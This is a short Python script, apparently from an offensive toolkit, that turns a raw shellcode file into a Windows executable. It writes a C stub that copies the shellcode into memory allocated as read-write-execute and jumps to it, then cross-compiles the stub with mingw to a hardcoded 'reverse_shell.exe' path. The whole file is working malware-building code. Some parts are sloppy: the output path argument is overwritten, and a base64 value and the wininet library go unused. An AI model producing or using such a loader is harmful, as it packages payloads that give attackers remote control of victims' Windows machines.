import os
import base64

def generate_exe(shellcode_path, output_path):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    b64_shellcode = base64.b64encode(shellcode).decode()

    stub = f"""
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

unsigned char shellcode[] = {{
{', '.join(f'0x{b:02x}' for b in shellcode)}
}};

int main() {{
    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
    return 0;
}}
"""

    with open("stub.c", "w") as f:
        f.write(stub)
    output_path = "build/payloads/reverse_shell.exe"
    os.system("x86_64-w64-mingw32-gcc stub.c -o {}".format(output_path))
    os.remove("stub.c")
    print(f"[+] EXE generated: {output_path}")

